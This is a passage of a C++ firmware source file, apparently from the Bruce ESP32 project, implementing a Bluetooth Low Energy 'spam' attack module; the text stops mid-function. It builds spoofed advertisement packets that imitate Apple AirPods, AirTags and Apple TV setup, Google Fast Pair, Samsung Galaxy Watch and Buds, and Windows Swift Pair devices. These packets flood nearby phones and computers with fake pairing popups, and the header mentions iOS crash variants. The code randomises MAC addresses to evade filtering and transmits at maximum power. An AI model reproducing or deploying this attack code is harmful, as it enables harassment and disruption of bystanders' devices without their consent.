/**
 * ble_spam.cpp — BLE Spam Module for Bruce Firmware
 *
 * Original BLE spam implementation by Bruce/EA7KDO.
 *
 * Major improvements by Doominator1 (https://github.com/Doominator1):
 *   - Unified spam UI with per-device selection, configurable adv/gap timing,
 *     TX power control, MAC randomisation frequency selector, and live pkt/s stats
 *   - Eliminated BLE stack deinit/init on MAC rotation — fixes crashes at tight intervals
 *   - xorshift64* PRNG for fast MAC generation without hardware RNG overhead
 *   - Watchdog reset in run loop for stability at tight intervals
 *   - BLE Beacon spam, Swift Pair presets + persistent custom name lists
 *   - Random/All added to Apple Pairing, Apple Action, Android, Samsung, Windows menus
 *   - Config persistence across reboots via Preferences
 *
 * Packet improvements merged from MarlinSchuck (https://github.com/MarlinSchuck):
 *   - Apple Continuity dynamic random fields matching Flipper Zero reference —
 *     triggers iOS popups where static payloads failed (ProximityPair, NearbyAction,
 *     CustomCrash variants)
 *   - Samsung EasySetup Galaxy Buds packet (previously only Watch was present)
 *   - Expanded Google FastPair model list (75+ models)
 *
 * Additional improvements by Ninja-jr (https://github.com/Ninja-jr):
 *   - Samsung device detection by MAC OUI for automatic FastPair selection
 *   - Smart Android spam: uses Samsung FastPair on Samsung devices, Google FastPair on others
 *   - Enhanced Apple Spam with iCloud binding spoofing (separate PR)
 *   - MAC randomization every packet for Apple Spam (same strategy as Samsung)
 *   - Single BLE stack initialization in Apple Spam (no deinit/init per packet)
 */

#include "ble_spam.h"
#include "core/display.h"
#include "core/mykeyboard.h"
#ifdef CONFIG_BT_NIMBLE_ENABLED
#if __has_include(<NimBLEExtAdvertising.h>)
#define NIMBLE_V2_PLUS 1
#endif
#include "esp_mac.h"
#if __has_include("host/ble_hs.h")
#include "host/ble_hs.h"
#define HAS_BLE_HS_H 1
#endif
#elif defined(CONFIG_BT_BLUEDROID_ENABLED)
#include "esp_gap_ble_api.h"
#endif
#include "esp_task_wdt.h"
#include <globals.h>
#if __has_include(<Preferences.h>)
#include <Preferences.h>
#define BLE_SPAM_HAS_PREFERENCES 1
#endif
#if defined(CONFIG_IDF_TARGET_ESP32C3) || defined(CONFIG_IDF_TARGET_ESP32C2) ||                              \
    defined(CONFIG_IDF_TARGET_ESP32S3)
#define MAX_TX_POWER ESP_PWR_LVL_P21
#elif defined(CONFIG_IDF_TARGET_ESP32H2) || defined(CONFIG_IDF_TARGET_ESP32C6) ||                            \
    defined(CONFIG_IDF_TARGET_ESP32C5)
#define MAX_TX_POWER ESP_PWR_LVL_P20
#else
#define MAX_TX_POWER ESP_PWR_LVL_P9
#endif

// ============================================================================
// Samsung Device Detection (Ninja-jr)
// ============================================================================
// Samsung MAC OUIs (first 3 bytes of MAC address)
// These are registered to Samsung Electronics Co., Ltd.
// Used to automatically select the correct FastPair type
// - Samsung FastPair for Samsung devices
// - Google FastPair for all other Android devices
// This improves Android spam coverage by using the right protocol for each device.

static const char *SAMSUNG_MAC_OUIS[] = {
    "00:1E:DF", // Samsung Electronics
    "00:23:E7", // Samsung Electronics
    "00:24:FE", // Samsung Electronics
    "00:26:5C", // Samsung Electronics
    "00:27:14", // Samsung Electronics
    "00:2A:10", // Samsung Electronics
    "00:2D:0A", // Samsung Electronics
    "00:30:FA", // Samsung Electronics
    "00:35:FE", // Samsung Electronics
    "00:3C:E4", // Samsung Electronics
    "00:40:96", // Samsung Electronics
    "00:44:01", // Samsung Electronics
    "00:4A:77", // Samsung Electronics
    "00:4D:4A", // Samsung Electronics
    "00:50:F7", // Samsung Electronics
    "00:54:08", // Samsung Electronics
    "00:57:7A", // Samsung Electronics
    "00:5A:38", // Samsung Electronics
    "00:5E:88", // Samsung Electronics
    "00:62:6E", // Samsung Electronics
    "00:64:22", // Samsung Electronics
    "00:66:44", // Samsung Electronics
    "00:68:EB", // Samsung Electronics
    "00:6A:94", // Samsung Electronics
    "00:6C:F0", // Samsung Electronics
    "00:6E:2A", // Samsung Electronics
    "00:70:89", // Samsung Electronics
    "00:72:44", // Samsung Electronics
    "00:74:04", // Samsung Electronics
    "00:76:5E", // Samsung Electronics
    "00:78:2C", // Samsung Electronics
    "00:7A:04", // Samsung Electronics
    "00:7C:2E", // Samsung Electronics
    "00:7E:58", // Samsung Electronics
    "00:80:82", // Samsung Electronics
};

static bool isSamsungDevice(const String &mac) {
    for (int i = 0; i < sizeof(SAMSUNG_MAC_OUIS) / sizeof(SAMSUNG_MAC_OUIS[0]); i++) {
        if (mac.startsWith(SAMSUNG_MAC_OUIS[i])) return true;
    }
    return false;
}

struct WatchModel {
    uint8_t value;
};
struct DeviceType {
    uint32_t value;
};

enum EBLEPayloadType { Microsoft, Samsung, Google };

// Apple Continuity — Nearby Action type codes
static const uint8_t continuity_na_actions[] = {
    0x13,
    0x24,
    0x05,
    0x27,
    0x20,
    0x19,
    0x1E,
    0x09,
    0x2F,
    0x02,
    0x0B,
    0x01,
    0x06,
    0x0D,
    0x2B,
};
static const int continuity_na_actions_count =
    sizeof(continuity_na_actions) / sizeof(continuity_na_actions[0]);

// ============================================================================
// Google Fast Pair — 3-byte model codes
// Expanded list (Doominator1 original + MarlinSchuck additions, deduped)
// Each triggers "New device nearby" Fast Pair popup on Android
// ============================================================================
const DeviceType android_models[] = {
    {0x0001F0}, {0x000047}, {0x470000}, {0x00000A}, {0x0A0000}, {0x00000B}, {0x0B0000}, {0x00000D},
    {0x000007}, {0x070000}, {0x000009}, {0x090000}, {0x000048}, {0x001000}, {0x00B727}, {0x01E5CE},
    {0x0200F0}, {0x00F7D4}, {0xF00002}, {0xF00400}, {0x1E89A7}, {0x0577B1}, {0x05A9BC}, {0xCD8256},
    {0x0000F0}, {0xF00000}, {0x821F66}, {0xF52494}, {0x718FA4}, {0x0002F0}, {0x92BBBD}, {0x000006},
    {0x060000}, {0xD446A7}, {0x2D7A23}, {0x038B91}, {0x02F637}, {0x02D886}, {0xF00001}, {0xF00201},
    {0xF00209}, {0xF00205}, {0xF00305}, {0xF00E97}, {0x04ACFC}, {0x04AA91}, {0x04AFB8}, {0x05A963},
    {0x05AA91}, {0x05C452}, {0x05C95C}, {0x0602F0}, {0x0603F0}, {0x1E8B18}, {0x1E955B}, {0x06AE20},
    {0x06C197}, {0x06C95C}, {0x06D8FC}, {0x0744B6}, {0x07A41C}, {0x07C95C}, {0x07F426}, {0x0102F0},
    {0x054B2D}, {0x0660D7}, {0x0103F0}, {0x0903F0}, {0x9ADB11}, {0x8B66AB}, {0xD99CA1}, {0x77FF67},
    {0xAA187F}, {0xDCE9EA}, {0x87B25F}, {0x1448C9}, {0x13B39D}, {0x7C6CDB}, {0x005EF9}, {0xE2106F},
    {0xB37A62}, {0x92ADC9}
};
int android_models_count = sizeof(android_models) / sizeof(android_models[0]);

// ============================================================================
// Samsung EasySetup — Galaxy Watch + Galaxy Buds models
// ============================================================================

// Galaxy Watch — single byte model selector, ported from the current Flipper
// Zero ble_spam app's samsung_watches table.
// Triggers "Galaxy Watch detected" pairing popup on Samsung Android devices
const WatchModel watch_models[] = {
    {0x1A}, {0x01}, {0x02}, {0x03}, {0x04}, {0x05}, {0x06}, {0x07}, {0x08}, {0x09}, {0x0A}, {0x0B},
    {0x0C}, {0x11}, {0x12}, {0x13}, {0x14}, {0x15}, {0x16}, {0x17}, {0x18}, {0x1B}, {0x1C}, {0x1D},
    {0x1E}, {0x20}, {0x21}, {0x22}, {0x23}, {0x24}, {0x25}, {0x26}, {0x27}, {0x28}, {0x29}, {0x2A},
    {0x30}, {0x31}, {0x32}, {0x33}, {0x34}, {0x35}, {0x40}, {0x41}, {0x42}, {0x60}, {0x61}, {0x62},
};
static const int watch_models_count = sizeof(watch_models) / sizeof(watch_models[0]);

// Galaxy Buds — 3-byte RGB color codes, ported from the current Flipper Zero
// ble_spam app's samsung_buds table.
// Triggers "Galaxy Buds detected" pairing popup on Samsung Android devices
static const uint32_t samsung_buds_models[] = {
    0xEE7A0C, 0x9D1700, 0x39EA48, 0xA7C62C, 0x850116, 0x3D8F41, 0x3B6D02, 0xAE063C, 0xB8B905, 0xEAAA17,
    0xD30704, 0x9DB006, 0x101F1A, 0x859608, 0x8E4503, 0x2C6740, 0x3F6718, 0x42C519, 0xAE073A, 0x011716,
    0x123456, 0x654321, 0x789ABC, 0xDEF123, 0x456789, 0xABC123, 0x321654, 0x987654, 0x654987, 0x321987,
};
static const int samsung_buds_count = sizeof(samsung_buds_models) / sizeof(samsung_buds_models[0]);

char randomNameBuffer[32];

const char *generateRandomName() {
    const char *charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
    int len = rand() % 10 + 1;
    if (len > 31) len = 31;
    for (int i = 0; i < len; ++i) { randomNameBuffer[i] = charset[rand() % strlen(charset)]; }
    randomNameBuffer[len] = '\0';
    return randomNameBuffer;
}

void generateRandomMac(uint8_t *mac) {
    esp_fill_random(mac, 6);
    mac[0] = (mac[0] & 0xFE) | 0x02;
}

BLEAdvertising *pAdvertising;

BLEAdvertisementData GetUniversalAdvertisementData(EBLEPayloadType Type, String customName = "") {
    BLEAdvertisementData AdvData = BLEAdvertisementData();
    uint8_t *AdvData_Raw = nullptr;
    uint8_t i = 0;
#ifndef NIMBLE_V2_PLUS
    static std::vector<uint8_t> advDataVector;
#endif

    switch (Type) {
        case Microsoft: {
            const char *Name;
            uint8_t name_len;

            if (customName.length() > 0) {
                Name = customName.c_str();
                name_len = customName.length();
            } else {
                Name = generateRandomName();
                name_len = strlen(Name);
            }
            if (name_len > 31) name_len = 31;

            uint8_t AdvData_Raw_Local[7 + 31];
            AdvData_Raw = AdvData_Raw_Local;
            AdvData_Raw[i++] = 6 + name_len;
            AdvData_Raw[i++] = 0xFF;
            AdvData_Raw[i++] = 0x06;
            AdvData_Raw[i++] = 0x00;
            AdvData_Raw[i++] = 0x03;
            AdvData_Raw[i++] = 0x00;
            AdvData_Raw[i++] = 0x80;
            memcpy(&AdvData_Raw[i], Name, name_len);
            i += name_len;
#ifdef NIMBLE_V2_PLUS
            AdvData.addData(AdvData_Raw, 7 + name_len);
#else
            advDataVector.assign(AdvData_Raw, AdvData_Raw + 7 + name_len);
            AdvData.addData(advDataVector);
#endif
            break;
        }
        case Samsung: {
            BLEAdvertisementData AdvData = BLEAdvertisementData();
#ifndef NIMBLE_V2_PLUS
            static std::vector<uint8_t> advDataVector;
#endif
            if (random(2) == 0) {
                // Galaxy Watch packet
                uint8_t model = watch_models[random(watch_models_count)].value;
                uint8_t Samsung_Data[15] = {
                    0x0E,
                    0xFF,
                    0x75,
                    0x00,
                    0x01,
                    0x00,
                    0x02,
                    0x00,
                    0x01,
                    0x01,
                    0xFF,
                    0x00,
                    0x00,
                    0x43,
                    (uint8_t)((model >> 0x00) & 0xFF)
                };
#ifdef NIMBLE_V2_PLUS
                AdvData.addData(Samsung_Data, 15);
#else
                advDataVector.assign(Samsung_Data, Samsung_Data + 15);
                AdvData.addData(advDataVector);
#endif
            } else {
                // Galaxy Buds packet (MarlinSchuck)
                uint32_t model = samsung_buds_models[random(samsung_buds_count)];
                uint8_t Buds_Data[31];
                uint8_t bi = 0;
                Buds_Data[bi++] = 27;
                Buds_Data[bi++] = 0xFF;
                Buds_Data[bi++] = 0x75;
                Buds_Data[bi++] = 0x00;
                Buds_Data[bi++] = 0x42;
                Buds_Data[bi++] = 0x09;
                Buds_Data[bi++] = 0x81;
                Buds_Data[bi++] = 0x02;
                Buds_Data[bi++] = 0x14;
                Buds_Data[bi++] = 0x15;
                Buds_Data[bi++] = 0x03;
                Buds_Data[bi++] = 0x21;
                Buds_Data[bi++] = 0x01;
                Buds_Data[bi++] = 0x09;
                Buds_Data[bi++] = (model >> 16) & 0xFF;
                Buds_Data[bi++] = (model >> 8) & 0xFF;
                Buds_Data[bi++] = 0x01;
                Buds_Data[bi++] = model & 0xFF;
                Buds_Data[bi++] = 0x06;
                Buds_Data[bi++] = 0x3C;
                Buds_Data[bi++] = 0x94;
                Buds_Data[bi++] = 0x8E;
                Buds_Data[bi++] = 0x00;
                Buds_Data[bi++] = 0x00;
                Buds_Data[bi++] = 0x00;
                Buds_Data[bi++] = 0x00;
                Buds_Data[bi++] = 0xC7;
                Buds_Data[bi++] = 0x00;
                // Trailing truncated record (length=0x10 claimed, only 2 data
                // bytes present) — ported from the Flipper Zero ble_spam app.
                // Real Galaxy Buds advertise this stub second record; without
                // it Samsung's scanner doesn't recognize the packet.
                Buds_Data[bi++] = 0x10;
                Buds_Data[bi++] = 0xFF;
                Buds_Data[bi++] = 0x75;
#ifdef NIMBLE_V2_PLUS
                AdvData.addData(Buds_Data, bi);
#else
                advDataVector.assign(Buds_Data, Buds_Data + bi);
                AdvData.addData(advDataVector);
#endif
            }
            return AdvData;
        }
        case Google: {
            const uint32_t model = android_models[rand() % android_models_count].value;
            uint8_t Google_Data[14] = {
                0x03,
                0x03,
                0x2C,
                0xFE,
                0x06,
                0x16,
                0x2C,
                0xFE,
                (uint8_t)((model >> 0x10) & 0xFF),
                (uint8_t)((model >> 0x08) & 0xFF),
                (uint8_t)((model >> 0x00) & 0xFF),
                0x02,
                0x0A,
                (uint8_t)((rand() % 120) - 100)
            };
#ifdef NIMBLE_V2_PLUS
            AdvData.addData(Google_Data, 14);
#else
            advDataVector.assign(Google_Data, Google_Data + 14);
            AdvData.addData(advDataVector);
#endif
            break;
        }
        default: {
            Serial.println("Please Provide a Company Type");
            break;
        }
    }

    return AdvData;
}

void ibeacon(const char *DeviceName, const char *BEACON_UUID, int ManufacturerId) {
    uint8_t macAddr[6];
    generateRandomMac(macAddr);
    esp_iface_mac_addr_set(macAddr, ESP_MAC_BT);

    BLEDevice::init(DeviceName);
    vTaskDelay(5 / portTICK_PERIOD_MS);
    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, MAX_TX_POWER);

    NimBLEBeacon myBeacon;
    myBeacon.setManufacturerId(0x4c00);
    myBeacon.setMajor(5);
    myBeacon.setMinor(88);
    myBeacon.setSignalPower(0xc5);
    myBeacon.setProximityUUID(BLEUUID(BEACON_UUID));

    pAdvertising = BLEDevice::getAdvertising();
    BLEAdvertisementData advertisementData = BLEAdvertisementData();
    advertisementData.setFlags(0x1A);
    advertisementData.setManufacturerData(myBeacon.getData());
    pAdvertising->setAdvertisementData(advertisementData);

    drawMainBorderWithTitle("iBeacon");
    padprintln("");
    padprintln("UUID:" + String(BEACON_UUID));
    padprintln("");
    padprintln("Press Any key to STOP.");

    while (!check(AnyKeyPress)) {
        pAdvertising->start();
        Serial.println("Advertizing started...");
        vTaskDelay(20 / portTICK_PERIOD_MS);
        pAdvertising->stop();
        vTaskDelay(5 / portTICK_PERIOD_MS);
        Serial.println("Advertizing stop");
    }

#if defined(CONFIG_IDF_TARGET_ESP32C5)
    esp_bt_controller_deinit();
#else
    BLEDevice::deinit();
#endif
}

enum BleSpamAttackType {
    BLE_SPAM_ATTACK_APPLE_PAIRING,
    BLE_SPAM_ATTACK_APPLE_ACTION,
    BLE_SPAM_ATTACK_APPLE_NOT_YOUR_DEVICE,
    BLE_SPAM_ATTACK_ANDROID_ALERT,
    BLE_SPAM_ATTACK_WINDOWS_SWIFT_PAIR,
    BLE_SPAM_ATTACK_SAMSUNG,
    BLE_SPAM_ATTACK_BLE_BEACON,
    BLE_SPAM_ATTACK_RANDOM_ALL
};

#define BLE_SPAM_MAX_CUSTOM_NAMES 20

static std::vector<String> bleSpamLoadCustomNames(const char *ns) {
    std::vector<String> names;
#if defined(BLE_SPAM_HAS_PREFERENCES)
    Preferences prefs;
    if (prefs.begin(ns, true)) {
        uint8_t count = prefs.getUChar("count", 0);
        for (uint8_t i = 0; i < count && i < BLE_SPAM_MAX_CUSTOM_NAMES; i++) {
            char key[8];
            snprintf(key, sizeof(key), "n%d", i);
            String val = prefs.getString(key, "");
            if (val.length() > 0) names.push_back(val);
        }
        prefs.end();
    }
#endif
    return names;
}

static void bleSpamSaveCustomNames(const char *ns, const std::vector<String> &names) {
#if defined(BLE_SPAM_HAS_PREFERENCES)
    Preferences prefs;
    if (prefs.begin(ns, false)) {
        prefs.putUChar("count", (uint8_t)names.size());
        for (size_t i = 0; i < names.size() && i < BLE_SPAM_MAX_CUSTOM_NAMES; i++) {
            char key[8];
            snprintf(key, sizeof(key), "n%d", (int)i);
            prefs.putString(key, names[i]);
        }
        prefs.end();
    }
#endif
}

static String bleSpamSwiftPairName = "";
static String bleSpamBeaconName = "";

enum BleSpamTxPower { BLE_SPAM_TX_MAX, BLE_SPAM_TX_HIGH, BLE_SPAM_TX_MEDIUM, BLE_SPAM_TX_LOW };

enum BleSpamMacRandMode {
    BLE_SPAM_MAC_OFF,
    BLE_SPAM_MAC_EVERY_PACKET,
    BLE_SPAM_MAC_EVERY_2,
    BLE_SPAM_MAC_EVERY_3,
    BLE_SPAM_MAC_EVERY_5,
    BLE_SPAM_MAC_EVERY_10,
    BLE_SPAM_MAC_EVERY_25,
    BLE_SPAM_MAC_EVERY_50
};

struct BleSpamAttackOption {
    BleSpamAttackType type;
    const char *label;
};

struct BleSpamConfig {
    uint32_t adv_ms = 15;
    uint32_t gap_ms = 5;
    BleSpamTxPower tx_power = BLE_SPAM_TX_MAX;
    BleSpamMacRandMode mac_rand_mode = BLE_SPAM_MAC_EVERY_3;
};

struct BleSpamSelection {
    BleSpamAttackType attack_type = BLE_SPAM_ATTACK_ANDROID_ALERT;
    int device_index = 0;
};

struct BleSpamListState {
    int cursor = 0;
    int scroll = 0;
    bool redraw = true;
};

struct BleSpamRunState {
    bool adv_active = false;
    uint32_t next_send_ms = 0;
    uint32_t adv_stop_ms = 0;
    uint32_t packet_counter = 0;
    uint32_t sent_count = 0;
    uint32_t window_start_ms = 0;
    uint32_t window_packets = 0;
    float pkt_s = 0.0f;
    bool mac_initialized = false;
    BleSpamTxPower applied_power = BLE_SPAM_TX_MAX;
    BleSpamAttackType cached_type = BLE_SPAM_ATTACK_ANDROID_ALERT;
    int cached_device_index = -1;
    bool cached_valid = false;
    BLEAdvertisementData cached_advertisement;
    BLEAdvertisementData working_advertisement;
};

struct BleSpamEditState {
    bool editing = false;
    int edit_row = 0;
    uint32_t adv_backup = 0;
    uint32_t gap_backup = 0;
    BleSpamTxPower tx_backup = BLE_SPAM_TX_MAX;
    BleSpamMacRandMode mac_backup = BLE_SPAM_MAC_EVERY_PACKET;
};

struct BleSpamListMetrics {
    int list_x = 0;
    int list_y = 0;
    int list_w = 0;
    int list_h = 0;
    int row_h = 0;
    int visible_rows = 0;
    int footer_y = 0;
};

static const uint32_t BLE_SPAM_STATS_UPDATE_MS = 500;
static const uint32_t BLE_SPAM_BLINK_MS = 250;

static const BleSpamAttackOption BLE_SPAM_ATTACK_OPTIONS[] = {
#if !defined(LITE_VERSION)
    {BLE_SPAM_ATTACK_APPLE_PAIRING,      "Apple Pairing Prompt" },
    {BLE_SPAM_ATTACK_APPLE_ACTION,       "Apple Action Modal"   },
    {BLE_SPAM_ATTACK_APPLE_NOT_YOUR_DEVICE, "Apple Not Your Device"},
#endif
    {BLE_SPAM_ATTACK_ANDROID_ALERT,      "Android Device Alert" },
    {BLE_SPAM_ATTACK_WINDOWS_SWIFT_PAIR, "Windows Swift Pair"   },
    {BLE_SPAM_ATTACK_SAMSUNG,            "Samsung BLE Spam"     },
    {BLE_SPAM_ATTACK_BLE_BEACON,         "BLE Beacon Spam"      },
    {BLE_SPAM_ATTACK_RANDOM_ALL,         "Random / All"         }
};

#if !defined(LITE_VERSION)
struct BleSpamAppleDevice {
    const char *ui_name;
    const char *payload_name;
};

// ProximityPair (Apple Pairing / Not Your Device) device list, ported from the
// current Flipper Zero ble_spam app's apple_devices table.
struct AppleProximityDevice {
    const char *name;
    uint16_t device_id;
};

static const AppleProximityDevice APPLE_PROXIMITY_DEVICES[] = {
    {"AirPods Pro",               0x0E20},
    {"AirPods Pro 2nd Gen",       0x1420},
    {"AirPods Pro 2nd Gen USB-C", 0x2420},
    {"AirPods 4 ANC",             0x2820},
    {"AirPods 4",                 0x2920},
    {"AirPods Max USB-C",         0x2B20},
    {"Beats Powerbeats Pro 2",    0x2C20},
    {"Beats Solo 3",              0x0620},
    {"AirPods Max",               0x0A20},
    {"Beats Flex",                0x1020},
    {"AirTag",                    0x0055},
    {"Hermes AirTag",             0x0030},
    {"AirPods",                   0x0220},
    {"AirPods 2nd Gen",           0x0F20},
    {"AirPods 3rd Gen",           0x1320},
    {"Powerbeats 3",              0x0320},
    {"Powerbeats Pro",            0x0B20},
    {"Beats Solo Pro",            0x0C20},
    {"Beats Studio Buds",         0x1120},
    {"Beats X",                   0x0520},
    {"Beats Studio 3",            0x0920},
    {"Beats Studio Pro",          0x1720},
    {"Beats Fit Pro",             0x1220},
    {"Beats Studio Buds+",        0x1620},
    {"Beats Solo 4",              0x2520},
    {"Beats Solo Buds",           0x2620},
    {"Powerbeats Fit",            0x2F20},
};
static const int APPLE_PROXIMITY_DEVICE_COUNT =
    sizeof(APPLE_PROXIMITY_DEVICES) / sizeof(APPLE_PROXIMITY_DEVICES[0]);

static const BleSpamAppleDevice BLE_SPAM_APPLE_ACTION_DEVICES[] = {
    {"Apple TV Setup",      "AppleTV Setup"     },
    {"Setup New Phone",     "Setup New Phone"   },
    {"Transfer Number",     "Transfer Number"   },
    {"TV Color Balance",    "TV Color Balance"  },
    {"Apple Vision Pro",    "Apple Vision Pro"  },
    {"Apple TV Connecting", "AppleTV Connecting"},
    {"Apple TV Audio Sync", "AppleTV Audio Sync"},
    {"Setup New Apple TV",  "Setup New AppleTV" },
    {"HomePod Setup",       "HomePod Setup"     },
    {"HomeKit Apple TV",    "HomeKit AppleTV"   },
    {"Pair Apple TV",       "Pair AppleTV"      },
    {"Setup New iPad",      "Setup New iPad"    }
};
#endif

static const char *BLE_SPAM_ANDROID_DEVICES[] = {"Pixel Fast Pair", "Generic Android Alert", "Random / All"};
// Windows: indices 0..3 are presets, 4 = Random/All, 5 = custom name (handled dynamically)
static const char *BLE_SPAM_WINDOWS_PRESETS[] = {
    "Generic Swift Pair",
    "Never Gonna Give You Up",
    "Bill Nye's iPhone",
    "Skibidi Toilet",
    "67",
    "FBI Surveillance Van"
};

// BLE Beacon: indices 0..N are presets, then Random/All, then saved custom names, then Add New
static const char *BLE_SPAM_BEACON_PRESETS[] = {
    "NeverGonnaGiveYoUp", "Bill Nye's iPhone", "Skibidi Toilet", "67", "FBISurveillanceVan"
};
static const char *BLE_SPAM_SAMSUNG_DEVICES[] = {
    "Galaxy Buds", "Galaxy Watch", "Generic Samsung", "Random / All"
};

// Special sentinel indices
#define BLE_SPAM_ANDROID_RANDOM_IDX 2
#define BLE_SPAM_SAMSUNG_RANDOM_IDX 3
#define BLE_SPAM_WINDOWS_RANDOM_IDX 5 // after presets
#define BLE_SPAM_WINDOWS_CUSTOM_IDX 6 // "+ Add New Custom Name" / custom saved

static const char *bleSpamTxPowerLabel(BleSpamTxPower level) {
    switch (level) {
        case BLE_SPAM_TX_MAX: return "MAX";
        case BLE_SPAM_TX_HIGH: return "HIGH";
        case BLE_SPAM_TX_MEDIUM: return "MEDIUM";
        case BLE_SPAM_TX_LOW: return "LOW";
        default: return "MAX";
    }
}

static const char *bleSpamMacRandLabel(BleSpamMacRandMode mode) {
    switch (mode) {
        case BLE_SPAM_MAC_OFF: return "Off";
        case BLE_SPAM_MAC_EVERY_PACKET: return "Every Packet";
        case BLE_SPAM_MAC_EVERY_2: return "Every 2 Packets";
        case BLE_SPAM_MAC_EVERY_3: return "Every 3 Packets";
        case BLE_SPAM_MAC_EVERY_5: return "Every 5 Packets";
        case BLE_SPAM_MAC_EVERY_10: return "Every 10 Packets";
        case BLE_SPAM_MAC_EVERY_25: return "Every 25 Packets";
        case BLE_SPAM_MAC_EVERY_50: return "Every 50 Packets";
        default: return "Every Packet";
    }
}

static uint32_t bleSpamMacRandDivisor(BleSpamMacRandMode mode) {
    switch (mode) {
        case BLE_SPAM_MAC_EVERY_PACKET: return 1;
        case BLE_SPAM_MAC_EVERY_2: return 2;
        case BLE_SPAM_MAC_EVERY_3: return 3;
        case BLE_SPAM_MAC_EVERY_5: return 5;
        case BLE_SPAM_MAC_EVERY_10: return 10;
        case BLE_SPAM_MAC_EVERY_25: return 25;
        case BLE_SPAM_MAC_EVERY_50: return 50;
        default: return 0;
    }
}

static uint32_t bleSpamClampMs(uint32_t ms) {
    if (ms < 1) return 1;
    if (ms > 10000) return 10000;
    return ms;
}

static BleSpamTxPower bleSpamClampTxPower(uint8_t value) {
    if (value > BLE_SPAM_TX_LOW) return BLE_SPAM_TX_MAX;
    return static_cast<BleSpamTxPower>(value);
}

static BleSpamMacRandMode bleSpamClampMacMode(uint8_t value) {
    if (value > BLE_SPAM_MAC_EVERY_50) return BLE_SPAM_MAC_EVERY_PACKET;
    return static_cast<BleSpamMacRandMode>(value);
}

static BleSpamConfig bleSpamLoadConfig() {
    BleSpamConfig config;
#if defined(BLE_SPAM_HAS_PREFERENCES)
    Preferences prefs;
    if (prefs.begin("ble_spam", false)) {
        uint8_t tx_init = prefs.getUChar("tx_init", 0);
        if (tx_init == 0) {
            config.adv_ms = 15;
            config.gap_ms = 5;
            config.mac_rand_mode = BLE_SPAM_MAC_EVERY_3;
            config.tx_power = BLE_SPAM_TX_MAX;
            prefs.putUInt("adv_ms", config.adv_ms);
            prefs.putUInt("gap_ms", config.gap_ms);
            prefs.putUChar("mac_rand", static_cast<uint8_t>(config.mac_rand_mode));
            prefs.putUChar("tx_power", static_cast<uint8_t>(config.tx_power));
            prefs.putUChar("tx_init", 1);
        } else {
            config.adv_ms = bleSpamClampMs(prefs.getUInt("adv_ms", config.adv_ms));
            config.gap_ms = bleSpamClampMs(prefs.getUInt("gap_ms", config.gap_ms));
            config.mac_rand_mode = bleSpamClampMacMode(prefs.getUChar("mac_rand", config.mac_rand_mode));
            config.tx_power = bleSpamClampTxPower(prefs.getUChar("tx_power", config.tx_power));
        }
        prefs.end();
    }
#endif
    return config;
}

static void bleSpamSaveConfig(const BleSpamConfig &config) {
#if defined(BLE_SPAM_HAS_PREFERENCES)
    Preferences prefs;
    if (prefs.begin("ble_spam", false)) {
        prefs.putUInt("adv_ms", bleSpamClampMs(config.adv_ms));
        prefs.putUInt("gap_ms", bleSpamClampMs(config.gap_ms));
        prefs.putUChar("tx_power", static_cast<uint8_t>(config.tx_power));
        prefs.putUChar("mac_rand", static_cast<uint8_t>(config.mac_rand_mode));
        prefs.putUChar("tx_init", 1);
        prefs.end();
    }
#endif
}

static uint32_t bleSpamMsStep(uint32_t ms) {
    // <= (not <) so stepping away from 20 in either direction uses step 1 —
    // otherwise decrementing from exactly 20 used the 10-199 bracket's step
    // (10) and jumped straight to 10, skipping 11-19, while incrementing from
    // 19 stayed on step 1. Keeps the whole 10-20 range at increments of 1.
    if (ms <= 20) return 1;
    if (ms < 200) return 10;
    if (ms < 1000) return 50;
    return 500;
}

static uint32_t bleSpamAdjustMs(uint32_t ms, int direction) {
    if (direction == 0) return ms;
    uint32_t step = bleSpamMsStep(ms);
    int32_t next = static_cast<int32_t>(ms) + direction * static_cast<int32_t>(step);
    if (next < 1) next = 1;
    if (next > 10000) next = 10000;
    return static_cast<uint32_t>(next);
}

static BleSpamListMetrics bleSpamGetListMetrics(int footerLines) {
    BleSpamListMetrics metrics;
    metrics.list_x = 10;
    metrics.list_y = BORDER_PAD_Y + FM * LH + 4;
    metrics.list_w = tftWidth - 20;
    int footer_h = footerLines * (FP * LH + 4);
    metrics.footer_y = tftHeight - footer_h - 10;
    metrics.list_h = metrics.footer_y - metrics.list_y - 2;
    metrics.row_h = max(12, FP * LH + 4);
    metrics.visible_rows = max(1, metrics.list_h / metrics.row_h);
    return metrics;
}

static String bleSpamTruncateText(const String &text, int maxWidth) {
    if (tft.textWidth(text.c_str()) <= maxWidth) return text;

    String trimmed = text;
    const String ellipsis = "...";
    int maxTextWidth = maxWidth - tft.textWidth(ellipsis.c_str());
    if (maxTextWidth <= 0) return ellipsis;

    while (trimmed.length() > 0 && tft.textWidth(trimmed.c_str()) > maxTextWidth) {
        trimmed.remove(trimmed.length() - 1);
    }
    return trimmed + ellipsis;
}

static String bleSpamMakeTitle(const String &title) {
    tft.setTextSize(FP);
    int maxWidth = tftWidth - 2 * BORDER_PAD_X;
    return bleSpamTruncateText(title, maxWidth);
}

static void bleSpamEnsureScroll(BleSpamListState &state, int itemCount, int visibleRows) {
    if (itemCount <= visibleRows) {
        state.scroll = 0;
        return;
    }
    if (state.cursor < state.scroll) state.scroll = state.cursor;
    if (state.cursor >= state.scroll + visibleRows) state.scroll = state.cursor - visibleRows + 1;
}

static void bleSpamRenderList(
    const String &title, int itemCount, const BleSpamListState &state, const BleSpamListMetrics &metrics,
    const std::function<const char *(int)> &labelFn, const char *footer, bool fullRedraw
) {
    if (fullRedraw) drawMainBorderWithTitle(bleSpamMakeTitle(title));

    tft.setTextSize(FP);
    tft.fillRect(metrics.list_x, metrics.list_y, metrics.list_w, metrics.list_h, bruceConfig.bgColor);

    for (int row = 0; row < metrics.visible_rows; row++) {
        int idx = state.scroll + row;
        int row_y = metrics.list_y + row * metrics.row_h;
        tft.fillRect(metrics.list_x, row_y, metrics.list_w, metrics.row_h, bruceConfig.bgColor);

        if (idx >= itemCount) continue;

        bool selected = (idx == state.cursor);
        uint16_t bg = selected ? bruceConfig.priColor : bruceConfig.bgColor;
        uint16_t fg = selected ? bruceConfig.bgColor : bruceConfig.priColor;

        tft.fillRect(metrics.list_x, row_y, metrics.list_w, metrics.row_h, bg);
        tft.setTextColor(fg, bg);

        String line = String(selected ? "> " : "  ") + labelFn(idx);
        line = bleSpamTruncateText(line, metrics.list_w - 6);
        tft.drawString(line, metrics.list_x + 4, row_y + 2, 1);
    }

    if (footer != nullptr) {
